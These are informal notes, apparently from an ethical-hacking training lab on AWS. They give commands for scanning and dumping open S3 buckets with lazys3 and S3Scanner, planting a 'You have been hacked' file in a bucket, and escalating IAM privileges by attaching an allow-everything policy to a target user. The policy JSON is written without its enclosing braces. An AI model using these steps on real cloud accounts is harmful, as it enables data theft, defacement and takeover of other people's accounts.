# cloud computing

 cd lazys3-master/

ruby lazys3.rb

To do so, type ruby lazys3.rb [Company] and press Enter.

cd S3Scanner/ 

pip3 install -r requirements.txt 

python3 ./s3scanner.py sites.txt and press Enter to run the tool.

# additional
Dump all open buckets and log both open and closed buckets in found.txt:

python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt

Just log open buckets in the default output file (buckets.txt):


python3 ./s3scanner.py names.txt

# hacking amazonn key website

pip3 install awscli

aws configure 

then go to firefox 

https://console.aws.amazon.com

Type your AWS account password in the Password field and click Sign in.

drop-down menu and click Security Credentials

access keys (access key ID and secret access key) in the Your Security Credentials section.

Copy the Access Key ID displayed by pressing Ctrl+C on your keyboard and switch to the Terminal window.

In the Default region name field, type eu-west-1 and press Enter.

Let us list the directories in the certifiedhacker1 bucket. In the terminal window, type aws s3 ls s3://[Bucket Name] (here, Bucket Name is certifiedhacker1) and press Enter.

type this in chrome

https://certifiedhacker1.s3.amazonaws.com

 next come to command 

echo “You have been hacked” >> Hack.txt
 
 next 

aws s3 mv Hack.txt s3://certifiedhacker1

now got o chrome and see you can see the hacktext with key at last do this 

Let us delete the Hack.txt file from the certifiedhacker1 bucket. In the terminal window, type aws s3 rm s3://certifiedhacker1/Hack.txt and press Enter.

 next

Escalate IAM User Privileges by Exploiting Misconfigured User Policy

# aws configure
vim user-policy.json 

 type this in 

"Version":"2012-10-17",

"Statement": [

{

    "Effect":"Allow",

    "Action":"*",

    "Resource":"*"

}

]

 Esc button. Then, type :wq! and press Enter to save the text document.
 
 type this full command 

aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json and press Enter.

In the terminal, type aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy and press Enter.

 next command

aws iam list-attached-user-policies --user-name [Target Username] 

aws iam list-users

Save the file listings of all open buckets to a file:

python ./s3scanner.py --list names.txt


